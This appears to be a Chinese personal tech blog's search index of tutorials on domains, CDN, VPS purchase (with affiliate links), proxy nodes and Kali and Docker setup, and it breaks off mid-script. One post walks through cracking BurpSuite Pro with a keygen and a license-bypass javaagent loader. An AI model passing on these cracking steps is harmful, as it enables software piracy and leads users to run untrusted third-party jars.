<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2019namesilo域名注册教程</title>
    <url>/archives/e21e7759.html</url>
    <content><![CDATA[<p>前面介绍过了免费域名的申请,这篇就介绍收费域名的注册,<br>选择<a href="https://www.namesilo.com/" title="namesilo">namesilo</a>的原因是因为有永久的隐私保护,大部分域名商是没有的,而且第二年续费的价格也不贵,不像一些域名商第一年便宜,第二年却特别贵.接下来就是注册的详细教程了 </p>
<span id="more"></span>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092949.png"> </p>
<p>选择隐私保护,这样别人whois查询的时候就得不到你详细的信息了,年限一般选择一年的 还有一个输入优惠码的地方,优惠码:silooneoff 可以优惠1刀,下面就是注册的东西了,就不详细介绍了.还是推荐谷歌账号</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092948.png"> </p>
<p><a href="https://www.namesilo.com/" title="namesilo">namesilo</a>也是支持支付宝付款的,（2020）最近发现也支持微信了，后面输入自己的邮箱.付款之后就是配置域名的解析了. </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092946.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092945.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092944.png"> </p>
<p>目前我手里的域名基本上都是在<a href="https://www.namesilo.com/" title="namesilo">namesilo</a>上注册的。</p>
]]></content>
      <categories>
        <category>VPS相关</category>
      </categories>
      <tags>
        <tag>namesilo</tag>
      </tags>
  </entry>
  <entry>
    <title>2019光盘刻录神器(软碟通)</title>
    <url>/archives/236cfebe.html</url>
    <content><![CDATA[<p>今天介绍一款ISO光盘刻录神器,那就是<a href="https://cn.ultraiso.net/xiazai.html" title="软碟通">软碟通</a>,这款软件的优势可以无限制的免费试用,是目前我一直在用的刻录软件,支持刻录U盘和光盘刻录,不过貌似不支持.img的镜像刻录,.img的镜像我用的是另外一款软件,下篇介绍,下面进入正题:</p>
<span id="more"></span>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092929.png"> </p>
<p>点击试用之后,选择自己iso镜像文件所在的目录,在选择自己想要刻录的系统,Linux或Windows,双击一下选择的镜像文件.</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092928.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092927.png"> </p>
<p>上面这个选项是刻录到U盘,相当于一个启动盘. </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092926.png"> </p>
<p>这个选项是光盘的刻录方式. </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092925.png"> </p>
<p>不管是u盘刻录还是光盘刻录都会进入这一步,这步主要就是检查一下镜像文件路径和刻录路径是否正确,这里需要提醒一点的就是这个软件U盘刻录的话,会把U盘格式化,请做好提前的文件备份.</p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>光盘刻录</tag>
      </tags>
  </entry>
  <entry>
    <title>2019免费CDN加速</title>
    <url>/archives/256061c7.html</url>
    <content><![CDATA[<p>之前由于网站是搭建在国外的vps上,所以国内访问会有不小延迟,因此选择了CDN加速,为什么选择<a href="https://www.cloudflare.com/" title="cloudflare">cloudflare</a>?因为它免费,服务商是国外,貌似跟国内服务商有合作,感觉相对用国内的感觉安全（个人感觉）.可能是心理上的吧!不管怎么说免费这点还是可以的。 </p>
<span id="more"></span>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092943.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092942.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092941.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092940.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092939.png"></p>
<p>这里说明一下正常应该是两条解析记录.默认是两个橙色的云朵,不用动.</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092938.png"></p>
<p>copy下两个DNS服务器地址,然后进入你域名注册商哪里更改默认的DNS服务器.下面这是freenom的: </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092937.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092936.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092935.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092934.png"> </p>
<p>这里输入你上面copy的DNS服务器地址.</p>
<p>namesilo的:</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092933.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092932.png"></p>
<p>然后返回<a href="https://dash.cloudflare.com/" title="cloudflare">cloudflare</a>下面这个页面你就可以看到一个成功的页面,不过要等个十几分钟大概.</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092931.png"> </p>
<p>接下来可以用站长工具进行ping检测,看看解析的是不是自己的真实ip 如果不是,证明CDN成功了.由于CDN节点可能有延迟,还能解析到原ip,这是正常的,过个一段时间就好了.大概像这个样子:</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092930.png"> </p>
<p>cloudflare直通车:<a href="https://dash.cloudflare.com/"></a><a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p>
<p>freenom直通车: <a href="https://my.freenom.com/"></a><a href="https://my.freenom.com/">https://my.freenom.com/</a></p>
<p>namesilo直通车: <a href="https://www.namesilo.com/"></a><a href="https://www.namesilo.com/">https://www.namesilo.com/</a></p>
<p>ping检测直通车: <a href="http://ping.chinaz.com/"></a><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p>
]]></content>
      <categories>
        <category>VPS相关</category>
      </categories>
      <tags>
        <tag>免费cdn</tag>
      </tags>
  </entry>
  <entry>
    <title>2019免费域名申请</title>
    <url>/archives/8c67ca26.html</url>
    <content><![CDATA[<p>国外域名申请的个人感觉<a href="https://my.freenom.com/" title="freenom">freenom</a>和<a href="https://www.namesilo.com/" title="namesilo">namesilo</a>这两家比较好用,至于为什么要申请国外的域名,主要是因为免备案,免去一些不必要的麻烦. 因为这篇讲的是免费域名的申请所以主要讲<a href="https://my.freenom.com/" title="freenom">freenom</a>的申请流程.话不多说,接下来开始申请流程</p>
<span id="more"></span>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092958.png"> </p>
<p>我用的是谷歌账号申请的,没有的就去申请一个吧,毕竟注册国外的一些东西用的比较多. </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092957.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092956.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092955.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092954.png"> </p>
<p>默认是三个月改成十二个月. </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092953.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092950.png"></p>
<p>至此你已经拥有一个域名了,接下来就是进行域名解析的配置了. </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092952.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092951.png"></p>
<p>全部流程也就结束了,是不是特别的简单? 那就赶紧注册一个免费的域名吧!</p>
]]></content>
      <categories>
        <category>VPS相关</category>
      </categories>
      <tags>
        <tag>免费域名申请</tag>
      </tags>
  </entry>
  <entry>
    <title>2019vps购买(搬瓦工)优惠</title>
    <url>/archives/73c4613f.html</url>
    <content><![CDATA[<p>这篇主要讲的是搬瓦工,它与<a href="https://www.vultr.com/?ref=8085416" title="vultr">vultr</a>最大的不同应该就是一个可以月付,一个必须年付,还有一点应该是机房所在地的问题了,<a href="https://bandwagonhost.com/aff.php?aff=52912" title="搬瓦工">搬瓦工</a>的机房几乎没有亚洲的,听说是有香港的不过很难抢到.而且价格相对较高.</p>
<span id="more"></span>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092968.png"> </p>
<p><a href="https://bandwagonhost.com/aff.php?aff=52912" title="搬瓦工">搬瓦工</a>的主机我选的是年付49.99刀的这款一般来说就够用了,而且我也没有特别大的需求,只是在上面做一个小站 </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092967.png"> </p>
<p>所以我就选的默认的这个. </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092966.png"> </p>
<p>接下来就是选择机房和买多久了.我选的也是默认的.选择完之后先不要先不要急着添加购物车,先右击查看源代码,因为这里面有优惠码 </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092965.png"></p>
<p>图中标注的字段就是优惠码了,复制一下,然后返回刚才的页面添加到购物车 </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092964.png"> </p>
<p>把复制的码粘贴到图中所标注的地,点击下个选项优惠多少就可以显示出来了. </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092963.png"> </p>
<p>点击checkout,进行下一步,这就到了注册付款界面了,<a href="https://bandwagonhost.com/aff.php?aff=52912" title="搬瓦工">搬瓦工</a>也是支持宝的.注册付完款之后,vps主机就购买成功了 </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092962.png"> </p>
<p>下一步进入到自己主机的管理界面. </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092961.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092960.png"> </p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092959.png"></p>
<p>在管理界面就可以看到自己的IP 端口号和登陆密码等详细信息了.到此你就拥有了一台自己的vps主机了.</p>
]]></content>
      <categories>
        <category>VPS相关</category>
      </categories>
      <tags>
        <tag>搬瓦工vps</tag>
      </tags>
  </entry>
  <entry>
    <title>2019购买vps主机(vultr)</title>
    <url>/archives/9e90c5a1.html</url>
    <content><![CDATA[<p>看了网上关于vps服务商的介绍,不过我感觉比较适合的还是 <a href="https://www.vultr.com/?ref=8085416" title="vultr">vultr</a>和 <a href="https://bandwagonhost.com/" title="搬瓦工">搬瓦工</a> 这两家服务商,因为都是比较大牌的服务商不用担心跑路的问题,主要是支持支付宝付款,价格也比较合理.这篇主要是讲<a href="https://www.vultr.com/?ref=8085416" title="vultr">vultr</a>,下面这个就是官网首页,不过不支持中文页面,不过可以使用谷歌浏览器的插件翻译一下,不过有些地方翻译的不准.<br><a href="https://www.vultr.com/?ref=8085416" title="vultr">vultr</a>目前是送100刀的优惠券。</p>
<span id="more"></span>

<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092975.png"></p>
<p>图中标注的地方输入邮箱,密码,点击验证,不过建议使用谷歌邮箱,至于什么原因,这里不做解释.</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092974.png"></p>
<p>注册完之后,按图中标注顺序进行用支付宝的充值,操作完会跳转支付宝扫码支付界面</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092973.png"></p>
<p>充值完之后接下来就是创建vps主机了,按图中标记点击,入创建主机界面.</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092972.png"> </p>
<p>至于主机类型一般选择第一个就好,机房的话,看自己需求吧,建议是新加坡和日本,毕竟距离相对较近,我自己在用是新加坡,速度还是蛮快的.操作系统的话,用的最多的就是centos和ubuntu系统了,下面就是付款方式了,这也算是<a href="https://www.vultr.com/?ref=8085416" title="vultr">vultr</a>的一个特色了,支持月付,不过不要选2.5刀的,有些是ipv6的地址.</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092971.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092970.png"></p>
<p>上面操作完成之后会进入自己创建好的主机页面,当状态显示running的时候证明服务主机已经启动了.然后点击主机名字进入查看主机的详细信息.</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/2019092969.png"></p>
<p>接下来就可以用远程连接工具进行连接了,像xshell,putty之类的工具.</p>
]]></content>
      <categories>
        <category>VPS相关</category>
      </categories>
      <tags>
        <tag>vultr</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.10月最新可看奈飞节点（JustMySocks）</title>
    <url>/archives/203a6258.html</url>
    <content><![CDATA[<p>之前一直在折腾自己搭建节点，后来感觉太麻烦，而且费用也不算太低。又要投入很大的经历去维护。在一次偶然的机会下，碰到了<a href="https://justmysocks.net/members/aff.php?aff=13156" title="justmysocks">justmysocks</a>,这个是比较推荐的目前已用将近半年，一直很稳定，毕竟属于老牌vps厂家搬瓦工。</p>
<ul>
<li>支持7天无理由退款</li>
<li>有SSR节点</li>
<li>有V2ray节点</li>
<li>可看奈飞</li>
<li>最新发现已经支持订阅功能</li>
<li>支持PayPal和支付宝</li>
<li>被qiang自动切换IP</li>
<li>5.2%优惠码：<a href="https://justmysocks.net/members/aff.php?aff=13156" title="justmysocks">JMS9272283</a></li>
</ul>
<p>下面开始注册教程：<br>进入<a href="https://justmysocks.net/members/aff.php?aff=13156" title="justmysocks">justmysocks</a>官网，点击注册，填写邮箱，地址，密码就行。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/netflix/QQ1.png"></p>
<p>进入服务页面，点击<a href="https://justmysocks.net/members/aff.php?aff=13156" title="justmysocks">justmysocks</a>，选择套餐，我选择的是9.88刀的价位，按自己需求来选择吧</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/netflix/QQ7.png"></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/netflix/QQ2.png"></p>
<p>选择付款方式。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/netflix/QQ3.png"></p>
<p>输入优惠码：<a href="https://justmysocks.net/members/aff.php?aff=13156" title="justmysocks">JMS9272283</a><br>点击检测，可以看到5.2%的优惠。是可以循环的。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/netflix/QQ4.png"></p>
<p>选择付款方式为支付宝。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/netflix/QQ5.png"></p>
<p>点击服务进去就可以看到自己的连接了。</p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/picture/netflix/QQ6.png"></p>
<p>今天自己测了一下可以看奈飞，昨天晚上八点多测速为10M每秒，速度还是可以的</p>
]]></content>
      <tags>
        <tag>V2ray 奈飞</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.2.1kali安装中文输入法及谷歌浏览器</title>
    <url>/archives/d3f5401b.html</url>
    <content><![CDATA[<p>kali安装中文输入法需要更改镜像源，官方源无法安装，更改镜像源方法见上篇<a href="https://vkali.com/posts/cbeb7845.html" title="2020kali镜像源大全">2020kali镜像源大全</a>，接下来先开始安装。</p>
<span id="more"></span>

<h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h2><p>在命令行中执行一下命令，执行前需要更新下源。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get -y install fcitx fcitx-googlepinyin</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>

<p>安装完成之后，重启一下，默认是CTRL+ space 键。</p>
<h2 id="安装谷歌浏览器"><a href="#安装谷歌浏览器" class="headerlink" title="安装谷歌浏览器"></a>安装谷歌浏览器</h2><p>首先打开火狐浏览器，用百度搜索谷歌浏览器桌面版，进入页面后下载deb结尾的安装包，然后打开下载目录，右击鼠标选择在此打开命令行。<br>安装谷歌浏览器需要很多依赖包，所以先下载一个软件包来安装它，包的名字叫做gdebi。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get -y install gdebi</span><br><span class="line"></span><br><span class="line">gdebi #后面跟上你所下载的谷歌安装包就可以了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>全部安装完成之后，在命令行输入google-chrome就可以打开谷歌浏览器了。</p>
]]></content>
      <categories>
        <category>网络安全攻防</category>
      </categories>
      <tags>
        <tag>kali linux</tag>
      </tags>
  </entry>
  <entry>
    <title>BurpSuitePro-2020.11.3破解及汉化</title>
    <url>/archives/126641e7.html</url>
    <content><![CDATA[<p>BurpSuite是一款集成化的渗透测试工具，包含了很多功能，可以帮助我们高效的完成对web应用程序的渗透测试与攻击。</p>
<span id="more"></span>

<p>之前用的的burpsuite不知道什么问题突然间出了问题，于是在GitHub重新找了一个破解方法及汉化方法，（感谢GitHub上的大佬们）此次是在虚拟机kali系统里进行的，win系统的破解方式基本一样，本文记录的是在linux平台下进行的破解及汉化。</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>kali2020.4系统</li>
<li>java-11</li>
<li>BurpSuitePro-2020.11.3</li>
<li>burp-keygen-scz.jar（用来破解license）</li>
<li>burp-loader-x-Ai.jar（每次启动需要加载）</li>
<li>BurpSuiteCnV2.0.jar(汉化)</li>
</ul>
<p>文末会给出原作者的GitHub链接，需要的话自行下载。</p>
<h1 id="破解过程"><a href="#破解过程" class="headerlink" title="破解过程"></a>破解过程</h1><ol>
<li>卸载kali自带的社区版的burpsuite。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove burpsuite</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>安装pro版的burpsuite。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=jar</span><br><span class="line"></span><br><span class="line">https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=windowsx64</span><br><span class="line"></span><br><span class="line">https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=macosx</span><br><span class="line"></span><br><span class="line">https://portswigger.net/burp/releases/download?product=pro&amp;version=2020.11.3&amp;type=linux</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>我安装时选择的是默认路径，所以安装在哪需要自己修改相应的路径，上面burp-keygen-scz.jar和burp-loader-x-Ai.jar放在burpsuite根目录下。kali2020.4默认带java11。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">启动burp-keygen-scz.jar，用来破解license</span><br><span class="line">/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar /opt/BurpSuite/burp-keygen-scz.jar</span><br><span class="line"></span><br><span class="line">加载 burp-loader-x-Ai.jar 启动 burpsuite_pro_v2020.11.3.jar</span><br><span class="line">/usr/lib/jvm/java-11-openjdk-amd64/bin/java -Dfile.encoding=utf-8 -noverify -javaagent:/opt/BurpSuitePro/burp-loader-x-Ai.jar -Xmx2048m -jar /opt/BurpSuitePro/burpsuite_pro.jar</span><br><span class="line"></span><br><span class="line">BurpSuite界面取消协助，同意协议</span><br><span class="line"></span><br><span class="line">随意修改 burp-keygen-scz 的 License Text</span><br><span class="line"></span><br><span class="line">把 License 复制到 BurpSuite</span><br><span class="line"></span><br><span class="line">点击 Manual activation，点击 Copy request</span><br><span class="line"></span><br><span class="line">把 Request 复制到 burp-keygen-scz 的 Activation Request</span><br><span class="line"></span><br><span class="line">把自动生成的 Activation Response 复制回 BurpSuite</span><br><span class="line"></span><br><span class="line">完成，开始使用</span><br><span class="line"></span><br><span class="line">持久启动必须加载 burp-loader-x-Ai.jar，不然依旧要license key</span><br><span class="line"></span><br><span class="line">可以写个执行的shell，扔到/usr/bin下面</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>脚本文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">/usr/lib/jvm/java-11-openjdk-amd64/bin/java -Dfile.encoding=utf-8 -noverify -javaagent:/opt/BurpSuitePro/burp-loader-x-Ai.jar -Xmx2048m -jar /opt/BurpSuitePro/burpsuite_pro.jar</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>建立桌面图标</li>
</ol>
<p>把上面shell脚本命名为BurpSuite,在编辑启动器命令框内写入以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh  -c &quot;/usr/bin/BurpSuite&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="汉化Burpsuite"><a href="#汉化Burpsuite" class="headerlink" title="汉化Burpsuite"></a>汉化Burpsuite</h1><p>下载BurpSuiteCnV2.0.jar到burpsuite根目录，并修改启动脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/lib/jvm/java-11-openjdk-amd64/bin/java -Dfile.encoding=utf-8 -noverify -javaagent:/opt/BurpSuitePro/BurpSuiteCnV2.0.jar -javaagent:/opt/BurpSuitePro/burp-loader-x-Ai.jar -Xmx2048m -jar /opt/BurpSuitePro/burpsuite_pro.jar</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>点击图标启动，启动完成之后即可汉化，而且是中英文对照的感觉不错。</p>
<h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><ul>
<li>burp-keygen-scz.jar： <a href="https://github.com/TrojanAZhen/BurpSuitePro-2.1">https://github.com/TrojanAZhen/BurpSuitePro-2.1</a></li>
<li>burp-loader-x-Ai.jar： <a href="https://github.com/TrojanAZhen/BurpSuitePro-2.1">https://github.com/TrojanAZhen/BurpSuitePro-2.1</a></li>
<li>BurpSuiteCnV2.0.jar： <a href="https://github.com/funkyoummp/BurpSuiteCn">https://github.com/funkyoummp/BurpSuiteCn</a></li>
</ul>
]]></content>
      <categories>
        <category>网络安全攻防</category>
      </categories>
      <tags>
        <tag>BurpSuite破解</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>2020kali镜像源大全</title>
    <url>/archives/cbeb7845.html</url>
    <content><![CDATA[<p>常用的kali镜像更新源以及更改方法。</p>
<h2 id="更改方法。"><a href="#更改方法。" class="headerlink" title="更改方法。"></a>更改方法。</h2><p>用vim打开sources.list文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h2 id="添加镜像源"><a href="#添加镜像源" class="headerlink" title="添加镜像源"></a>添加镜像源</h2><p>镜像源如下，我比较常用的是中科大和阿里云的源。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line">#阿里云</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line">#清华大学</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"> </span><br><span class="line">#浙大</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"> </span><br><span class="line">#东软大学</span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"> </span><br><span class="line">#官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line">deb http://mirrors.163.com/debian/ jessie main non-free contrib</span><br><span class="line">deb http://mirrors.163.com/debian/ jessie-updates main non-free contrib</span><br><span class="line">deb http://mirrors.163.com/debian/ jessie-backports main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian/ jessie main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian/ jessie-updates main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian/ jessie-backports main non-free contrib</span><br><span class="line">deb http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>把源添加进文件后，需要使用命令更新，否则不生效。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update  # 取回更新的软件包列表信息</span><br><span class="line">sudo apt-get upgrade # 进行一次升级</span><br><span class="line">sudo apt-get clean # 删除已经下载的安装包</span><br><span class="line">sudo reboot  #重启</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>网络安全攻防</category>
      </categories>
      <tags>
        <tag>kali Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7安装docker和docker-compose</title>
    <url>/archives/ce06018d.html</url>
    <content><![CDATA[<p>在做实验的过程中少不了搭建环境，但是要一个个去搭建服务，无疑是特别浪费时间的，用docker可以解决这些问题。</p>
<span id="more"></span>
<h2 id="用VMware安装Linux系统"><a href="#用VMware安装Linux系统" class="headerlink" title="用VMware安装Linux系统"></a>用VMware安装Linux系统</h2><p>本身用的笔记本安装的centos7系统，我选择的是最小化安装，这样可以把它当作一个模板机，之后无论需要多少直接克隆即可。由于是最小化安装，所以缺少很多包，需要对模板机安装一些必备的软件和设置。</p>
<h3 id="关闭selinux"><a href="#关闭selinux" class="headerlink" title="关闭selinux"></a>关闭selinux</h3><p>selinux开启可能会造成一些不必要的问题，排错不好找原因，所以选择关闭。<br>文件所在位置为/etc/selinux/config</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 原文件为:</span><br><span class="line">SELINUX=enforcing</span><br><span class="line">//改为</span><br><span class="line">SELINUX=disabled</span><br></pre></td></tr></table></figure>

<h3 id="卸载自带防火墙"><a href="#卸载自带防火墙" class="headerlink" title="卸载自带防火墙"></a>卸载自带防火墙</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y remove firewalld</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="更改镜像源"><a href="#更改镜像源" class="headerlink" title="更改镜像源"></a>更改镜像源</h3><p>这里用的是阿里云的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 删除系统自带的镜像源</span><br><span class="line">rm -rf /etc/yum.repos.d/*</span><br><span class="line">// 下载阿里云镜像文件</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">// 清除系统缓存</span><br><span class="line">yum clean all</span><br><span class="line">// 生成缓存</span><br><span class="line">yum makecache</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install net-tools vim git python3</span><br></pre></td></tr></table></figure>

<h2 id="使用脚本安装docker"><a href="#使用脚本安装docker" class="headerlink" title="使用脚本安装docker"></a>使用脚本安装docker</h2><p>脚本是从网上找的<br>新建脚本文件为docker-install.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#</span><br><span class="line">#********************************************************************</span><br><span class="line">#Author:        wangxiaochun</span><br><span class="line">#QQ:            29308620</span><br><span class="line">#Date:          2020-01-26</span><br><span class="line">#FileName：      install_docker_for_centos7.sh</span><br><span class="line">#URL:           http://www.magedu.com</span><br><span class="line">#Description：       The test script</span><br><span class="line">#Copyright (C):     2020 All rights reserved</span><br><span class="line">#********************************************************************</span><br><span class="line">COLOR=&quot;echo -e \\033[1;31m&quot;</span><br><span class="line">END=&quot;\033[m&quot;</span><br><span class="line">VERSION=&quot;19.03.5-3.el7&quot;</span><br><span class="line">wget -P /etc/yum.repos.d/ https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo  || &#123; $&#123;COLOR&#125;&quot;互联网连接失败，请检查网络配置!&quot;$&#123;END&#125;;exit; &#125;</span><br><span class="line">yum clean all </span><br><span class="line">yum -y install docker-ce-$VERSION docker-ce-cli-$VERSION || &#123; 